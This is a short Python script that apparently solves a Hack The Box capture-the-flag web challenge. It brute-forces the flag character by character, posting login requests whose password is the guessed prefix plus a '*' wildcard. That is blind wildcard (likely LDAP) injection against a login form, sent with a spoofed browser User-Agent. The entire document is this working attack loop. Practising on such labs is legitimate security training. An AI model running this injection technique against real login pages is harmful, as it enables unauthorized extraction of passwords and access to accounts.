import requests
import string

address = '188.166.169.86:32382'
flag = 'HTB{d1rectory_h4xx0r'

while True:
	for c in string.ascii_lowercase + string.digits + '_}':
		test_flag = flag + c
		data = {"username" : "Reese", "password" : test_flag + '*'}
		r = requests.post(f'http://{address}/login', data, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36'})
		if r.url.endswith('failed'):
			continue
		else:
			flag += c
			print(flag)
			break
